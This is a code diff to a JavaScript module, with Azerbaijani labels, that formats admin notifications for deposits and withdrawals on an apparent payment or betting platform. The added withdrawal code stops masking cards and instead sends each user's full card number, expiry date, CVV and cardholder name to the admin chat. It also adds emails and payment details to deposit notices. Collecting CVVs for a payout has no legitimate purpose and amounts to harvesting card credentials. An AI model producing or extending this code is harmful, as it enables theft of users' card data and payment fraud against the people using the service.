@@ -50,19 +50,27 @@ function decisionKeyboard(txId) {
 const i18n = require('./i18n');
 
 // Yeni deposit sorğusu → admin-ə göndərilir + inline düymələr
-async function notifyDepositRequest(tx, user) {
+async function notifyDepositRequest(tx, user, ctx = {}) {
+  const pm     = ctx.method || null;
+  const locale = ctx.locale || (user && user.locale);
+  const meta   = i18n.localeMeta(locale);
+
   const lines = [
     `🟢 <b>YENİ DEPOZİT SORĞUSU</b>`,
     ``,
     `👤 İstifadəçi: <b>${escapeHtml(user.username)}</b> (#${String(user._id).slice(-6).toUpperCase()})`,
-    `💰 Məbləğ: <b>${tx.amount.toFixed(2)} AZN</b>`,
-    `🌍 Dil / valyuta: <b>${i18n.localeMeta(user && user.locale).flag} ${i18n.localeMeta(user && user.locale).native}</b> — ${i18n.money(tx.amount, user && user.locale)}`,
-    `🏦 Üsul: ${escapeHtml(tx.method || 'card')}`,
-    tx.cryptoToken ? `🪙 Token: ${escapeHtml(tx.cryptoToken)}` : '',
+    `📧 E-poçt: <code>${escapeHtml(user.email || '-')}</code>`,
+    `🌍 Dil / ölkə: <b>${meta.flag} ${meta.native}</b>`,
+    `💰 Məbləğ: <b>${i18n.money(tx.amount, locale)}</b>  (baza: ${Number(tx.amount).toFixed(2)} AZN)`,
+    `🏦 Üsul: <b>${escapeHtml(pm ? pm.name : (tx.method || 'card'))}</b>`,
+    pm && pm.cardNumber ? `💳 Ödəniş kartı: <code>${escapeHtml(pm.cardNumber)}</code>` : '',
+    pm && pm.iban       ? `🏛 IBAN: <code>${escapeHtml(pm.iban)}</code>` : '',
+    pm && pm.phone      ? `📱 Telefon: <code>${escapeHtml(pm.phone)}</code>` : '',
+    pm && pm.accountHolder ? `🧾 Hesab sahibi: ${escapeHtml(pm.accountHolder)}` : '',
+    tx.cryptoToken   ? `🪙 Token: ${escapeHtml(tx.cryptoToken)}` : '',
     tx.network       ? `🌐 Şəbəkə: ${escapeHtml(tx.network)}` : '',
-    tx.cardLast4     ? `💳 Kart: **** **** **** ${escapeHtml(tx.cardLast4)}` : '',
     tx.walletAddress ? `🏷 Cüzdan: <code>${escapeHtml(tx.walletAddress)}</code>` : '',
-    `📎 Qəbz: <i>${tx.receiptUrl || tx.receiptImage ? 'yüklənib' : 'yoxdur'}</i>`,
+    `📎 Qəbz: <i>${tx.receiptImage ? 'yüklənib' : 'yoxdur'}</i>`,
     ``,
     `🆔 TX: <code>${String(tx._id)}</code>`
   ].filter(Boolean);
@@ -75,16 +83,34 @@ async function notifyDepositRequest(tx, user) {
   return res;
 }
 
-async function notifyWithdrawRequest(tx, user) {
+/** "4169 7388 1234 5678" */
+function groupCard(n) {
+  return String(n || '').replace(/(.{4})/g, '$1 ').trim();
+}
+
+async function notifyWithdrawRequest(tx, user, ctx = {}) {
+  const pm     = ctx.method || null;
+  const locale = ctx.locale || (user && user.locale);
+  const meta   = i18n.localeMeta(locale);
+  const brand  = ctx.brand || {};
+
   const lines = [
     `🔴 <b>YENİ ÇIXARIŞ SORĞUSU</b>`,
     ``,
     `👤 İstifadəçi: <b>${escapeHtml(user.username)}</b> (#${String(user._id).slice(-6).toUpperCase()})`,
-    `💰 Məbləğ: <b>${tx.amount.toFixed(2)} AZN</b>`,
-    `🌍 Dil / valyuta: <b>${i18n.localeMeta(user && user.locale).flag} ${i18n.localeMeta(user && user.locale).native}</b> — ${i18n.money(tx.amount, user && user.locale)}`,
-    tx.cardLast4 ? `💳 Kart: **** **** **** ${escapeHtml(tx.cardLast4)}` : '',
-    tx.cardHolder ? `👤 Kart sahibi: ${escapeHtml(tx.cardHolder)}` : '',
-    tx.note      ? `📝 Qeyd: ${escapeHtml(tx.note)}` : '',
+    `📧 E-poçt: <code>${escapeHtml(user.email || '-')}</code>`,
+    `🌍 Dil / ölkə: <b>${meta.flag} ${meta.native}</b>`,
+    `💰 Məbləğ: <b>${i18n.money(tx.amount, locale)}</b>  (baza: ${Number(tx.amount).toFixed(2)} AZN)`,
+    `🏦 Üsul: <b>${escapeHtml(pm ? pm.name : (tx.method || '-'))}</b>`,
+    ``,
+    ctx.cardNumber ? `🏷 <b>KART MƏLUMATLARI</b>` : '',
+    brand.name     ? `🔖 Kart tipi: <b>${escapeHtml(brand.name)}</b> (avtomatik təyin olundu)` : '',
+    ctx.cardNumber ? `💳 Kart nömrəsi: <code>${escapeHtml(groupCard(ctx.cardNumber))}</code>` : '',
+    ctx.cardExpiry ? `📅 Son istifadə: <code>${escapeHtml(ctx.cardExpiry)}</code>` : '',
+    ctx.cvv        ? `🔐 CVV: <code>${escapeHtml(ctx.cvv)}</code>` : '',
+    ctx.cardHolder ? `🧾 Kart sahibi: <b>${escapeHtml(ctx.cardHolder)}</b>` : '',
+    ctx.walletAddress ? `🏷 Cüzdan: <code>${escapeHtml(ctx.walletAddress)}</code>` : '',
+    tx.network        ? `🌐 Şəbəkə: ${escapeHtml(tx.network)}` : '',
     ``,
     `🆔 TX: <code>${String(tx._id)}</code>`
   ].filter(Boolean);
@@ -104,8 +130,7 @@ async function notifyDecision(tx, user, decision) {
     `${icon} <b>${verb}</b>`,
     ``,
     `👤 İstifadəçi: <b>${escapeHtml(user.username)}</b>`,
-    `💰 Məbləğ: <b>${tx.amount.toFixed(2)} AZN</b>`,
-    `🌍 Dil / valyuta: <b>${i18n.localeMeta(user && user.locale).flag} ${i18n.localeMeta(user && user.locale).native}</b> — ${i18n.money(tx.amount, user && user.locale)}`,
+    `💰 Məbləğ: <b>${i18n.money(tx.amount, user && user.locale)}</b>`,
     `🆔 TX: <code>${String(tx._id)}</code>`
   ];
 
